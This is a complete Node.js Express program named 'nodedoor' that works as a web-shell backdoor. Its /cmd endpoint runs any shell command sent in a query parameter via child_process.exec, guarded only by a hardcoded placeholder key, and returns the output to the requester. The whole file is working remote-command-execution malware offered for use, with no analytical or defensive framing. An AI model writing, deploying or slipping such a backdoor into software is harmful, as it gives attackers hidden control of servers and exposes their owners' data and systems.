const express = require('express');
const { exec } = require('child_process');

const app = express();
const PORT = 3000;
const SECRET_KEY = "SECRETKEY"; // gantisakarepmu

app.get('/cmd', (req, res) => {
    const key = req.query.key;
    const command = req.query.cmd;

    if (key !== SECRET_KEY) {
        return res.status(403).send("Access Denied!");
    }

    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.send(`<pre>Error: ${stderr}</pre>`);
        }
        res.send(`<pre>${stdout}</pre>`);
    });
});

app.listen(PORT, () => {
    console.log(`nodedoor listening on port ${PORT}`);
});
